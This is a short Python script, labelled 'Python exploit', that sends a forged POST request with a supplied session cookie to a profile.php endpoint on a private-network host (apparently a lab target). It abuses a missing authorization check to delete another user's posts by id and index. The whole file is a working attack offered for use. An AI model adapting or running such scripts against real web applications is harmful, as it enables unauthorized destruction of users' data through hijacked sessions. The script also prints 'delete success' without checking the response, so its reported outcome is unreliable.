import requests
import html
import argparse
import os
import re

def delete(cookie,username,id,index):
    url = "http://192.168.11.128/profile.php?username={}".format(username)
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64)','Cookie':'PHPSESSID={}'.format(cookie)}
    data = {"id":id,"action":'delete_{}'.format(index)}
    res= requests.post(url, headers = headers,data=data)
    print('delete success')

if __name__ == '__main__':
    parser=argparse.ArgumentParser(description='Python exploit')
    parser.add_argument('-c',"--cookie",default=None)
    parser.add_argument("--idpost",default=None)
    parser.add_argument("--username",default=None)
    parser.add_argument("--index",default=None)
    args=parser.parse_args()
    args = parser.parse_args()
    if args.cookie  != None:
        if args.username != None:
            if args.idpost !=None:
                if args.index != None:
                    delete(args.cookie,args.username,args.idpost,args.index)